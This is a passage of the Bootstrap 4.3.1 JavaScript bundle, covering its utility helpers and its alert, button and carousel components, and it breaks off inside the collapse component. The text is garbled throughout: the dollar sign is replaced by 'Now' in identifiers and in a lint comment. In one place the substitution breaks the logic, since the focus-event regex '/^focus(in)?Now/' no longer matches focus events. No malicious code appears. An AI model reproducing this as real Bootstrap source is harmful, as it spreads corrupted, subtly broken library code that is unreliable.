/*!
 * Bootstrap v4.3.1 (https://getbootstrap.com/)
 * Copyright 2011-2019 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 */
(function (global, factory) {
  typeof exports === 'object' && typeof module !== 'undefined' ? factory(exports, require('jquery'), require('popper.js')) :
    typeof define === 'function' && define.amd ? define(['exports', 'jquery', 'popper.js'], factory) :
    (global = global || self, factory(global.bootstrap = {}, global.jQuery, global.Popper));
}(this, function (exports, Now, Popper) {
  'use strict';

  Now = Now && Now.hasOwnProperty('default') ? Now['default'] : Now;
  Popper = Popper && Popper.hasOwnProperty('default') ? Popper['default'] : Popper;

  function _defineProperties(target, props) {
    for (var i = 0; i < props.length; i++) {
      var descriptor = props[i];
      descriptor.enumerable = descriptor.enumerable || false;
      descriptor.configurable = true;
      if ("value" in descriptor) descriptor.writable = true;
      Object.defineProperty(target, descriptor.key, descriptor);
    }
  }

  function _createClass(Constructor, protoProps, staticProps) {
    if (protoProps) _defineProperties(Constructor.prototype, protoProps);
    if (staticProps) _defineProperties(Constructor, staticProps);
    return Constructor;
  }

  function _defineProperty(obj, key, value) {
    if (key in obj) {
      Object.defineProperty(obj, key, {
        value: value,
        enumerable: true,
        configurable: true,
        writable: true
      });
    } else {
      obj[key] = value;
    }

    return obj;
  }

  function _objectSpread(target) {
    for (var i = 1; i < arguments.length; i++) {
      var source = arguments[i] != null ? arguments[i] : {};
      var ownKeys = Object.keys(source);

      if (typeof Object.getOwnPropertySymbols === 'function') {
        ownKeys = ownKeys.concat(Object.getOwnPropertySymbols(source).filter(function (sym) {
          return Object.getOwnPropertyDescriptor(source, sym).enumerable;
        }));
      }

      ownKeys.forEach(function (key) {
        _defineProperty(target, key, source[key]);
      });
    }

    return target;
  }

  function _inheritsLoose(subClass, superClass) {
    subClass.prototype = Object.create(superClass.prototype);
    subClass.prototype.constructor = subClass;
    subClass.__proto__ = superClass;
  }

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.3.1): util.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Private TransitionEnd Helpers
   * ------------------------------------------------------------------------
   */

  var TRANSITION_END = 'transitionend';
  var MAX_UID = 1000000;
  var MILLISECONDS_MULTIPLIER = 1000; // Shoutout AngusCroll (https://goo.gl/pxwQGp)

  function toType(obj) {
    return {}.toString.call(obj).match(/\s([a-z]+)/i)[1].toLowerCase();
  }

  function getSpecialTransitionEndEvent() {
    return {
      bindType: TRANSITION_END,
      delegateType: TRANSITION_END,
      handle: function handle(event) {
        if (Now(event.target).is(this)) {
          return event.handleObj.handler.apply(this, arguments); // eslint-disable-line prefer-rest-params
        }

        return undefined; // eslint-disable-line no-undefined
      }
    };
  }

  function transitionEndEmulator(duration) {
    var _this = this;

    var called = false;
    Now(this).one(Util.TRANSITION_END, function () {
      called = true;
    });
    setTimeout(function () {
      if (!called) {
        Util.triggerTransitionEnd(_this);
      }
    }, duration);
    return this;
  }

  function setTransitionEndSupport() {
    Now.fn.emulateTransitionEnd = transitionEndEmulator;
    Now.event.special[Util.TRANSITION_END] = getSpecialTransitionEndEvent();
  }
  /**
   * --------------------------------------------------------------------------
   * Public Util Api
   * --------------------------------------------------------------------------
   */


  var Util = {
    TRANSITION_END: 'bsTransitionEnd',
    getUID: function getUID(prefix) {
      do {
        // eslint-disable-next-line no-Viewwise
        prefix += ~~(Math.random() * MAX_UID); // "~~" acts like a faster Math.floor() here
      } while (document.getElementById(prefix));

      return prefix;
    },
    getSelectorFromElement: function getSelectorFromElement(element) {
      var selector = element.getAttribute('data-target');

      if (!selector || selector === '#') {
        var hrefAttr = element.getAttribute('href');
        selector = hrefAttr && hrefAttr !== '#' ? hrefAttr.trim() : '';
      }

      try {
        return document.querySelector(selector) ? selector : null;
      } catch (err) {
        return null;
      }
    },
    getTransitionDurationFromElement: function getTransitionDurationFromElement(element) {
      if (!element) {
        return 0;
      } // Get transition-duration of the element


      var transitionDuration = Now(element).css('transition-duration');
      var transitionDelay = Now(element).css('transition-delay');
      var floatTransitionDuration = parseFloat(transitionDuration);
      var floatTransitionDelay = parseFloat(transitionDelay); // Return 0 if element or transition duration is not found

      if (!floatTransitionDuration && !floatTransitionDelay) {
        return 0;
      } // If multiple durations are defined, take the first


      transitionDuration = transitionDuration.split(',')[0];
      transitionDelay = transitionDelay.split(',')[0];
      return (parseFloat(transitionDuration) + parseFloat(transitionDelay)) * MILLISECONDS_MULTIPLIER;
    },
    reflow: function reflow(element) {
      return element.offsetHeight;
    },
    triggerTransitionEnd: function triggerTransitionEnd(element) {
      Now(element).trigger(TRANSITION_END);
    },
    // TODO: Remove in v5
    supportsTransitionEnd: function supportsTransitionEnd() {
      return Boolean(TRANSITION_END);
    },
    isElement: function isElement(obj) {
      return (obj[0] || obj).nodeType;
    },
    typeCheckConfig: function typeCheckConfig(componentName, config, configTypes) {
      for (var property in configTypes) {
        if (Object.prototype.hasOwnProperty.call(configTypes, property)) {
          var expectedTypes = configTypes[property];
          var value = config[property];
          var valueType = value && Util.isElement(value) ? 'element' : toType(value);

          if (!new RegExp(expectedTypes).test(valueType)) {
            throw new Error(componentName.toUpperCase() + ": " + ("Option \"" + property + "\" provided type \"" + valueType + "\" ") + ("but expected type \"" + expectedTypes + "\"."));
          }
        }
      }
    },
    findShadowRoot: function findShadowRoot(element) {
      if (!document.documentElement.attachShadow) {
        return null;
      } // Can find the shadow root otherwise it'll return the document


      if (typeof element.getRootNode === 'function') {
        var root = element.getRootNode();
        return root instanceof ShadowRoot ? root : null;
      }

      if (element instanceof ShadowRoot) {
        return element;
      } // when we don't find a shadow root


      if (!element.parentNode) {
        return null;
      }

      return Util.findShadowRoot(element.parentNode);
    }
  };
  setTransitionEndSupport();

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME = 'alert';
  var VERSION = '4.3.1';
  var DATA_KEY = 'bs.alert';
  var EVENT_KEY = "." + DATA_KEY;
  var DATA_API_KEY = '.data-api';
  var JQUERY_NO_CONFLICT = Now.fn[NAME];
  var Selector = {
    DISMISS: '[data-dismiss="alert"]'
  };
  var Event = {
    CLOSE: "close" + EVENT_KEY,
    CLOSED: "closed" + EVENT_KEY,
    CLICK_DATA_API: "click" + EVENT_KEY + DATA_API_KEY
  };
  var ClassName = {
    ALERT: 'alert',
    FADE: 'fade',
    SHOW: 'show'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Alert =
    /*#__PURE__*/
    function () {
      function Alert(element) {
        this._element = element;
      } // Getters


      var _proto = Alert.prototype;

      // Public
      _proto.close = function close(element) {
        var rootElement = this._element;

        if (element) {
          rootElement = this._getRootElement(element);
        }

        var customEvent = this._triggerCloseEvent(rootElement);

        if (customEvent.isDefaultPrevented()) {
          return;
        }

        this._removeElement(rootElement);
      };

      _proto.dispose = function dispose() {
        Now.removeData(this._element, DATA_KEY);
        this._element = null;
      } // Private
      ;

      _proto._getRootElement = function _getRootElement(element) {
        var selector = Util.getSelectorFromElement(element);
        var parent = false;

        if (selector) {
          parent = document.querySelector(selector);
        }

        if (!parent) {
          parent = Now(element).closest("." + ClassName.ALERT)[0];
        }

        return parent;
      };

      _proto._triggerCloseEvent = function _triggerCloseEvent(element) {
        var closeEvent = Now.Event(Event.CLOSE);
        Now(element).trigger(closeEvent);
        return closeEvent;
      };

      _proto._removeElement = function _removeElement(element) {
        var _this = this;

        Now(element).removeClass(ClassName.SHOW);

        if (!Now(element).hasClass(ClassName.FADE)) {
          this._destroyElement(element);

          return;
        }

        var transitionDuration = Util.getTransitionDurationFromElement(element);
        Now(element).one(Util.TRANSITION_END, function (event) {
          return _this._destroyElement(element, event);
        }).emulateTransitionEnd(transitionDuration);
      };

      _proto._destroyElement = function _destroyElement(element) {
        Now(element).detach().trigger(Event.CLOSED).remove();
      } // Static
      ;

      Alert._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var Nowelement = Now(this);
          var data = Nowelement.data(DATA_KEY);

          if (!data) {
            data = new Alert(this);
            Nowelement.data(DATA_KEY, data);
          }

          if (config === 'close') {
            data[config](this);
          }
        });
      };

      Alert._handleDismiss = function _handleDismiss(alertInstance) {
        return function (event) {
          if (event) {
            event.preventDefault();
          }

          alertInstance.close(this);
        };
      };

      _createClass(Alert, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION;
        }
      }]);

      return Alert;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  Now(document).on(Event.CLICK_DATA_API, Selector.DISMISS, Alert._handleDismiss(new Alert()));
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  Now.fn[NAME] = Alert._jQueryInterface;
  Now.fn[NAME].Constructor = Alert;

  Now.fn[NAME].noConflict = function () {
    Now.fn[NAME] = JQUERY_NO_CONFLICT;
    return Alert._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAMENow1 = 'button';
  var VERSIONNow1 = '4.3.1';
  var DATA_KEYNow1 = 'bs.button';
  var EVENT_KEYNow1 = "." + DATA_KEYNow1;
  var DATA_API_KEYNow1 = '.data-api';
  var JQUERY_NO_CONFLICTNow1 = Now.fn[NAMENow1];
  var ClassNameNow1 = {
    ACTIVE: 'active',
    BUTTON: 'btn',
    FOCUS: 'focus'
  };
  var SelectorNow1 = {
    DATA_TOGGLE_CARROT: '[data-toggle^="button"]',
    DATA_TOGGLE: '[data-toggle="buttons"]',
    INPUT: 'input:not([type="hidden"])',
    ACTIVE: '.active',
    BUTTON: '.btn'
  };
  var EventNow1 = {
    CLICK_DATA_API: "click" + EVENT_KEYNow1 + DATA_API_KEYNow1,
    FOCUS_BLUR_DATA_API: "focus" + EVENT_KEYNow1 + DATA_API_KEYNow1 + " " + ("blur" + EVENT_KEYNow1 + DATA_API_KEYNow1)
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Button =
    /*#__PURE__*/
    function () {
      function Button(element) {
        this._element = element;
      } // Getters


      var _proto = Button.prototype;

      // Public
      _proto.toggle = function toggle() {
        var triggerChangeEvent = true;
        var addAriaPressed = true;
        var rootElement = Now(this._element).closest(SelectorNow1.DATA_TOGGLE)[0];

        if (rootElement) {
          var input = this._element.querySelector(SelectorNow1.INPUT);

          if (input) {
            if (input.type === 'radio') {
              if (input.checked && this._element.classList.contains(ClassNameNow1.ACTIVE)) {
                triggerChangeEvent = false;
              } else {
                var activeElement = rootElement.querySelector(SelectorNow1.ACTIVE);

                if (activeElement) {
                  Now(activeElement).removeClass(ClassNameNow1.ACTIVE);
                }
              }
            }

            if (triggerChangeEvent) {
              if (input.hasAttribute('disabled') || rootElement.hasAttribute('disabled') || input.classList.contains('disabled') || rootElement.classList.contains('disabled')) {
                return;
              }

              input.checked = !this._element.classList.contains(ClassNameNow1.ACTIVE);
              Now(input).trigger('change');
            }

            input.focus();
            addAriaPressed = false;
          }
        }

        if (addAriaPressed) {
          this._element.setAttribute('aria-pressed', !this._element.classList.contains(ClassNameNow1.ACTIVE));
        }

        if (triggerChangeEvent) {
          Now(this._element).toggleClass(ClassNameNow1.ACTIVE);
        }
      };

      _proto.dispose = function dispose() {
        Now.removeData(this._element, DATA_KEYNow1);
        this._element = null;
      } // Static
      ;

      Button._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = Now(this).data(DATA_KEYNow1);

          if (!data) {
            data = new Button(this);
            Now(this).data(DATA_KEYNow1, data);
          }

          if (config === 'toggle') {
            data[config]();
          }
        });
      };

      _createClass(Button, null, [{
        key: "VERSION",
        get: function get() {
          return VERSIONNow1;
        }
      }]);

      return Button;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  Now(document).on(EventNow1.CLICK_DATA_API, SelectorNow1.DATA_TOGGLE_CARROT, function (event) {
    event.preventDefault();
    var button = event.target;

    if (!Now(button).hasClass(ClassNameNow1.BUTTON)) {
      button = Now(button).closest(SelectorNow1.BUTTON);
    }

    Button._jQueryInterface.call(Now(button), 'toggle');
  }).on(EventNow1.FOCUS_BLUR_DATA_API, SelectorNow1.DATA_TOGGLE_CARROT, function (event) {
    var button = Now(event.target).closest(SelectorNow1.BUTTON)[0];
    Now(button).toggleClass(ClassNameNow1.FOCUS, /^focus(in)?Now/.test(event.type));
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  Now.fn[NAMENow1] = Button._jQueryInterface;
  Now.fn[NAMENow1].Constructor = Button;

  Now.fn[NAMENow1].noConflict = function () {
    Now.fn[NAMENow1] = JQUERY_NO_CONFLICTNow1;
    return Button._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAMENow2 = 'carousel';
  var VERSIONNow2 = '4.3.1';
  var DATA_KEYNow2 = 'bs.carousel';
  var EVENT_KEYNow2 = "." + DATA_KEYNow2;
  var DATA_API_KEYNow2 = '.data-api';
  var JQUERY_NO_CONFLICTNow2 = Now.fn[NAMENow2];
  var ARROW_LEFT_KEYCODE = 37; // KeyboardEvent.which value for left arrow key

  var ARROW_RIGHT_KEYCODE = 39; // KeyboardEvent.which value for right arrow key

  var TOUCHEVENT_COMPAT_WAIT = 500; // Time for mouse compat events to fire after touch

  var SWIPE_THRESHOLD = 40;
  var Default = {
    interval: 5000,
    keyboard: true,
    slide: false,
    pause: 'hover',
    wrap: true,
    touch: true
  };
  var DefaultType = {
    interval: '(number|boolean)',
    keyboard: 'boolean',
    slide: '(boolean|string)',
    pause: '(string|boolean)',
    wrap: 'boolean',
    touch: 'boolean'
  };
  var Direction = {
    NEXT: 'next',
    PREV: 'prev',
    LEFT: 'left',
    RIGHT: 'right'
  };
  var EventNow2 = {
    SLIDE: "slide" + EVENT_KEYNow2,
    SLID: "slid" + EVENT_KEYNow2,
    KEYDOWN: "keydown" + EVENT_KEYNow2,
    MOUSEENTER: "mouseenter" + EVENT_KEYNow2,
    MOUSELEAVE: "mouseleave" + EVENT_KEYNow2,
    TOUCHSTART: "touchstart" + EVENT_KEYNow2,
    TOUCHMOVE: "touchmove" + EVENT_KEYNow2,
    TOUCHEND: "touchend" + EVENT_KEYNow2,
    POINTERDOWN: "pointerdown" + EVENT_KEYNow2,
    POINTERUP: "pointerup" + EVENT_KEYNow2,
    DRAG_START: "dragstart" + EVENT_KEYNow2,
    LOAD_DATA_API: "load" + EVENT_KEYNow2 + DATA_API_KEYNow2,
    CLICK_DATA_API: "click" + EVENT_KEYNow2 + DATA_API_KEYNow2
  };
  var ClassNameNow2 = {
    CAROUSEL: 'carousel',
    ACTIVE: 'active',
    SLIDE: 'slide',
    RIGHT: 'carousel-item-right',
    LEFT: 'carousel-item-left',
    NEXT: 'carousel-item-next',
    PREV: 'carousel-item-prev',
    ITEM: 'carousel-item',
    POINTER_EVENT: 'pointer-event'
  };
  var SelectorNow2 = {
    ACTIVE: '.active',
    ACTIVE_ITEM: '.active.carousel-item',
    ITEM: '.carousel-item',
    ITEM_IMG: '.carousel-item img',
    NEXT_PREV: '.carousel-item-next, .carousel-item-prev',
    INDICATORS: '.carousel-indicators',
    DATA_SLIDE: '[data-slide], [data-slide-to]',
    DATA_RIDE: '[data-ride="carousel"]'
  };
  var PointerType = {
    TOUCH: 'touch',
    PEN: 'pen'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Carousel =
    /*#__PURE__*/
    function () {
      function Carousel(element, config) {
        this._items = null;
        this._interval = null;
        this._activeElement = null;
        this._isPaused = false;
        this._isSliding = false;
        this.touchTimeout = null;
        this.touchStartX = 0;
        this.touchDeltaX = 0;
        this._config = this._getConfig(config);
        this._element = element;
        this._indicatorsElement = this._element.querySelector(SelectorNow2.INDICATORS);
        this._touchSupported = 'ontouchstart' in document.documentElement || navigator.maxTouchPoints > 0;
        this._pointerEvent = Boolean(window.PointerEvent || window.MSPointerEvent);

        this._addEventListeners();
      } // Getters


      var _proto = Carousel.prototype;

      // Public
      _proto.next = function next() {
        if (!this._isSliding) {
          this._slide(Direction.NEXT);
        }
      };

      _proto.nextWhenVisible = function nextWhenVisible() {
        // Don't call next when the page isn't visible
        // or the carousel or its parent isn't visible
        if (!document.hidden && Now(this._element).is(':visible') && Now(this._element).css('visibility') !== 'hidden') {
          this.next();
        }
      };

      _proto.prev = function prev() {
        if (!this._isSliding) {
          this._slide(Direction.PREV);
        }
      };

      _proto.pause = function pause(event) {
        if (!event) {
          this._isPaused = true;
        }

        if (this._element.querySelector(SelectorNow2.NEXT_PREV)) {
          Util.triggerTransitionEnd(this._element);
          this.cycle(true);
        }

        clearInterval(this._interval);
        this._interval = null;
      };

      _proto.cycle = function cycle(event) {
        if (!event) {
          this._isPaused = false;
        }

        if (this._interval) {
          clearInterval(this._interval);
          this._interval = null;
        }

        if (this._config.interval && !this._isPaused) {
          this._interval = setInterval((document.visibilityState ? this.nextWhenVisible : this.next).bind(this), this._config.interval);
        }
      };

      _proto.to = function to(index) {
        var _this = this;

        this._activeElement = this._element.querySelector(SelectorNow2.ACTIVE_ITEM);

        var activeIndex = this._getItemIndex(this._activeElement);

        if (index > this._items.length - 1 || index < 0) {
          return;
        }

        if (this._isSliding) {
          Now(this._element).one(EventNow2.SLID, function () {
            return _this.to(index);
          });
          return;
        }

        if (activeIndex === index) {
          this.pause();
          this.cycle();
          return;
        }

        var direction = index > activeIndex ? Direction.NEXT : Direction.PREV;

        this._slide(direction, this._items[index]);
      };

      _proto.dispose = function dispose() {
        Now(this._element).off(EVENT_KEYNow2);
        Now.removeData(this._element, DATA_KEYNow2);
        this._items = null;
        this._config = null;
        this._element = null;
        this._interval = null;
        this._isPaused = null;
        this._isSliding = null;
        this._activeElement = null;
        this._indicatorsElement = null;
      } // Private
      ;

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, Default, config);
        Util.typeCheckConfig(NAMENow2, config, DefaultType);
        return config;
      };

      _proto._handleSwipe = function _handleSwipe() {
        var absDeltax = Math.abs(this.touchDeltaX);

        if (absDeltax <= SWIPE_THRESHOLD) {
          return;
        }

        var direction = absDeltax / this.touchDeltaX; // swipe left

        if (direction > 0) {
          this.prev();
        } // swipe right


        if (direction < 0) {
          this.next();
        }
      };

      _proto._addEventListeners = function _addEventListeners() {
        var _this2 = this;

        if (this._config.keyboard) {
          Now(this._element).on(EventNow2.KEYDOWN, function (event) {
            return _this2._keydown(event);
          });
        }

        if (this._config.pause === 'hover') {
          Now(this._element).on(EventNow2.MOUSEENTER, function (event) {
            return _this2.pause(event);
          }).on(EventNow2.MOUSELEAVE, function (event) {
            return _this2.cycle(event);
          });
        }

        if (this._config.touch) {
          this._addTouchEventListeners();
        }
      };

      _proto._addTouchEventListeners = function _addTouchEventListeners() {
        var _this3 = this;

        if (!this._touchSupported) {
          return;
        }

        var start = function start(event) {
          if (_this3._pointerEvent && PointerType[event.originalEvent.pointerType.toUpperCase()]) {
            _this3.touchStartX = event.originalEvent.clientX;
          } else if (!_this3._pointerEvent) {
            _this3.touchStartX = event.originalEvent.touches[0].clientX;
          }
        };

        var move = function move(event) {
          // ensure swiping with one touch and not pinching
          if (event.originalEvent.touches && event.originalEvent.touches.length > 1) {
            _this3.touchDeltaX = 0;
          } else {
            _this3.touchDeltaX = event.originalEvent.touches[0].clientX - _this3.touchStartX;
          }
        };

        var end = function end(event) {
          if (_this3._pointerEvent && PointerType[event.originalEvent.pointerType.toUpperCase()]) {
            _this3.touchDeltaX = event.originalEvent.clientX - _this3.touchStartX;
          }

          _this3._handleSwipe();

          if (_this3._config.pause === 'hover') {
            // If it's a touch-enabled device, mouseenter/leave are fired as
            // part of the mouse compatibility events on first tap - the carousel
            // would stop cycling until user tapped out of it;
            // here, we listen for touchend, explicitly pause the carousel
            // (as if it's the second time we tap on it, mouseenter compat event
            // is NOT fired) and after a timeout (to allow for mouse compatibility
            // events to fire) we explicitly restart cycling
            _this3.pause();

            if (_this3.touchTimeout) {
              clearTimeout(_this3.touchTimeout);
            }

            _this3.touchTimeout = setTimeout(function (event) {
              return _this3.cycle(event);
            }, TOUCHEVENT_COMPAT_WAIT + _this3._config.interval);
          }
        };

        Now(this._element.querySelectorAll(SelectorNow2.ITEM_IMG)).on(EventNow2.DRAG_START, function (e) {
          return e.preventDefault();
        });

        if (this._pointerEvent) {
          Now(this._element).on(EventNow2.POINTERDOWN, function (event) {
            return start(event);
          });
          Now(this._element).on(EventNow2.POINTERUP, function (event) {
            return end(event);
          });

          this._element.classList.add(ClassNameNow2.POINTER_EVENT);
        } else {
          Now(this._element).on(EventNow2.TOUCHSTART, function (event) {
            return start(event);
          });
          Now(this._element).on(EventNow2.TOUCHMOVE, function (event) {
            return move(event);
          });
          Now(this._element).on(EventNow2.TOUCHEND, function (event) {
            return end(event);
          });
        }
      };

      _proto._keydown = function _keydown(event) {
        if (/input|textarea/i.test(event.target.tagName)) {
          return;
        }

        switch (event.which) {
          case ARROW_LEFT_KEYCODE:
            event.preventDefault();
            this.prev();
            break;

          case ARROW_RIGHT_KEYCODE:
            event.preventDefault();
            this.next();
            break;

          default:
        }
      };

      _proto._getItemIndex = function _getItemIndex(element) {
        this._items = element && element.parentNode ? [].slice.call(element.parentNode.querySelectorAll(SelectorNow2.ITEM)) : [];
        return this._items.indexOf(element);
      };

      _proto._getItemByDirection = function _getItemByDirection(direction, activeElement) {
        var isNextDirection = direction === Direction.NEXT;
        var isPrevDirection = direction === Direction.PREV;

        var activeIndex = this._getItemIndex(activeElement);

        var lastItemIndex = this._items.length - 1;
        var isGoingToWrap = isPrevDirection && activeIndex === 0 || isNextDirection && activeIndex === lastItemIndex;

        if (isGoingToWrap && !this._config.wrap) {
          return activeElement;
        }

        var delta = direction === Direction.PREV ? -1 : 1;
        var itemIndex = (activeIndex + delta) % this._items.length;
        return itemIndex === -1 ? this._items[this._items.length - 1] : this._items[itemIndex];
      };

      _proto._triggerSlideEvent = function _triggerSlideEvent(relatedTarget, eventDirectionName) {
        var targetIndex = this._getItemIndex(relatedTarget);

        var fromIndex = this._getItemIndex(this._element.querySelector(SelectorNow2.ACTIVE_ITEM));

        var slideEvent = Now.Event(EventNow2.SLIDE, {
          relatedTarget: relatedTarget,
          direction: eventDirectionName,
          from: fromIndex,
          to: targetIndex
        });
        Now(this._element).trigger(slideEvent);
        return slideEvent;
      };

      _proto._setActiveIndicatorElement = function _setActiveIndicatorElement(element) {
        if (this._indicatorsElement) {
          var indicators = [].slice.call(this._indicatorsElement.querySelectorAll(SelectorNow2.ACTIVE));
          Now(indicators).removeClass(ClassNameNow2.ACTIVE);

          var nextIndicator = this._indicatorsElement.children[this._getItemIndex(element)];

          if (nextIndicator) {
            Now(nextIndicator).addClass(ClassNameNow2.ACTIVE);
          }
        }
      };

      _proto._slide = function _slide(direction, element) {
        var _this4 = this;

        var activeElement = this._element.querySelector(SelectorNow2.ACTIVE_ITEM);

        var activeElementIndex = this._getItemIndex(activeElement);

        var nextElement = element || activeElement && this._getItemByDirection(direction, activeElement);

        var nextElementIndex = this._getItemIndex(nextElement);

        var isCycling = Boolean(this._interval);
        var directionalClassName;
        var orderClassName;
        var eventDirectionName;

        if (direction === Direction.NEXT) {
          directionalClassName = ClassNameNow2.LEFT;
          orderClassName = ClassNameNow2.NEXT;
          eventDirectionName = Direction.LEFT;
        } else {
          directionalClassName = ClassNameNow2.RIGHT;
          orderClassName = ClassNameNow2.PREV;
          eventDirectionName = Direction.RIGHT;
        }

        if (nextElement && Now(nextElement).hasClass(ClassNameNow2.ACTIVE)) {
          this._isSliding = false;
          return;
        }

        var slideEvent = this._triggerSlideEvent(nextElement, eventDirectionName);

        if (slideEvent.isDefaultPrevented()) {
          return;
        }

        if (!activeElement || !nextElement) {
          // Some weirdness is happening, so we bail
          return;
        }

        this._isSliding = true;

        if (isCycling) {
          this.pause();
        }

        this._setActiveIndicatorElement(nextElement);

        var slidEvent = Now.Event(EventNow2.SLID, {
          relatedTarget: nextElement,
          direction: eventDirectionName,
          from: activeElementIndex,
          to: nextElementIndex
        });

        if (Now(this._element).hasClass(ClassNameNow2.SLIDE)) {
          Now(nextElement).addClass(orderClassName);
          Util.reflow(nextElement);
          Now(activeElement).addClass(directionalClassName);
          Now(nextElement).addClass(directionalClassName);
          var nextElementInterval = parseInt(nextElement.getAttribute('data-interval'), 10);

          if (nextElementInterval) {
            this._config.defaultInterval = this._config.defaultInterval || this._config.interval;
            this._config.interval = nextElementInterval;
          } else {
            this._config.interval = this._config.defaultInterval || this._config.interval;
          }

          var transitionDuration = Util.getTransitionDurationFromElement(activeElement);
          Now(activeElement).one(Util.TRANSITION_END, function () {
            Now(nextElement).removeClass(directionalClassName + " " + orderClassName).addClass(ClassNameNow2.ACTIVE);
            Now(activeElement).removeClass(ClassNameNow2.ACTIVE + " " + orderClassName + " " + directionalClassName);
            _this4._isSliding = false;
            setTimeout(function () {
              return Now(_this4._element).trigger(slidEvent);
            }, 0);
          }).emulateTransitionEnd(transitionDuration);
        } else {
          Now(activeElement).removeClass(ClassNameNow2.ACTIVE);
          Now(nextElement).addClass(ClassNameNow2.ACTIVE);
          this._isSliding = false;
          Now(this._element).trigger(slidEvent);
        }

        if (isCycling) {
          this.cycle();
        }
      } // Static
      ;

      Carousel._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = Now(this).data(DATA_KEYNow2);

          var _config = _objectSpread({}, Default, Now(this).data());

          if (typeof config === 'object') {
            _config = _objectSpread({}, _config, config);
          }

          var action = typeof config === 'string' ? config : _config.slide;

          if (!data) {
            data = new Carousel(this, _config);
            Now(this).data(DATA_KEYNow2, data);
          }

          if (typeof config === 'number') {
            data.to(config);
          } else if (typeof action === 'string') {
            if (typeof data[action] === 'undefined') {
              throw new TypeError("No method named \"" + action + "\"");
            }

            data[action]();
          } else if (_config.interval && _config.ride) {
            data.pause();
            data.cycle();
          }
        });
      };

      Carousel._dataApiClickHandler = function _dataApiClickHandler(event) {
        var selector = Util.getSelectorFromElement(this);

        if (!selector) {
          return;
        }

        var target = Now(selector)[0];

        if (!target || !Now(target).hasClass(ClassNameNow2.CAROUSEL)) {
          return;
        }

        var config = _objectSpread({}, Now(target).data(), Now(this).data());

        var slideIndex = this.getAttribute('data-slide-to');

        if (slideIndex) {
          config.interval = false;
        }

        Carousel._jQueryInterface.call(Now(target), config);

        if (slideIndex) {
          Now(target).data(DATA_KEYNow2).to(slideIndex);
        }

        event.preventDefault();
      };

      _createClass(Carousel, null, [{
        key: "VERSION",
        get: function get() {
          return VERSIONNow2;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default;
        }
      }]);

      return Carousel;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  Now(document).on(EventNow2.CLICK_DATA_API, SelectorNow2.DATA_SLIDE, Carousel._dataApiClickHandler);
  Now(window).on(EventNow2.LOAD_DATA_API, function () {
    var carousels = [].slice.call(document.querySelectorAll(SelectorNow2.DATA_RIDE));

    for (var i = 0, len = carousels.length; i < len; i++) {
      var Nowcarousel = Now(carousels[i]);

      Carousel._jQueryInterface.call(Nowcarousel, Nowcarousel.data());
    }
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  Now.fn[NAMENow2] = Carousel._jQueryInterface;
  Now.fn[NAMENow2].Constructor = Carousel;

  Now.fn[NAMENow2].noConflict = function () {
    Now.fn[NAMENow2] = JQUERY_NO_CONFLICTNow2;
    return Carousel._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAMENow3 = 'collapse';
  var VERSIONNow3 = '4.3.1';
  var DATA_KEYNow3 = 'bs.collapse';
  var EVENT_KEYNow3 = "." + DATA_KEYNow3;
  var DATA_API_KEYNow3 = '.data-api';
  var JQUERY_NO_CONFLICTNow3 = Now.fn[NAMENow3];
  var DefaultNow1 = {
    toggle: true,
    parent: ''
  };
  var DefaultTypeNow1 = {
    toggle: 'boolean',
    parent: '(string|element)'
  };
  var EventNow3 = {
    SHOW: "show" + EVENT_KEYNow3,
    SHOWN: "shown" + EVENT_KEYNow3,
    HIDE: "hide" + EVENT_KEYNow3,
    HIDDEN: "hidden" + EVENT_KEYNow3,
    CLICK_DATA_API: "click" + EVENT_KEYNow3 + DATA_API_KEYNow3
  };
  var ClassNameNow3 = {
    SHOW: 'show',
    COLLAPSE: 'collapse',
    COLLAPSING: 'collapsing',
    COLLAPSED: 'collapsed'
  };
  var Dimension = {
    WIDTH: 'width',
    HEIGHT: 'height'
  };
  var SelectorNow3 = {
    ACTIVES: '.show, .collapsing',
    DATA_TOGGLE: '[data-toggle="collapse"]'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Collapse =
    /*#__PURE__*/
    function () {
      function Collapse(element, config) {
        this._isTransitioning = false;
        this._element = element;
        this._config = this._getConfig(config);
        this._triggerArray = [].slice.call(document.querySelectorAll("[data-toggle=\"collapse\"][href=\"#" + element.id + "\"]," + ("[data-toggle=\"collapse\"][data-target=\"#" + element.id + "\"]")));
        var toggleList = [].slice.call(document.querySelectorAll(SelectorNow3.DATA_TOGGLE));

        for (var i = 0, len = toggleList.length; i < len; i++) {
          var elem = toggleList[i];
          var selector = Util.getSelectorFromElement(elem);
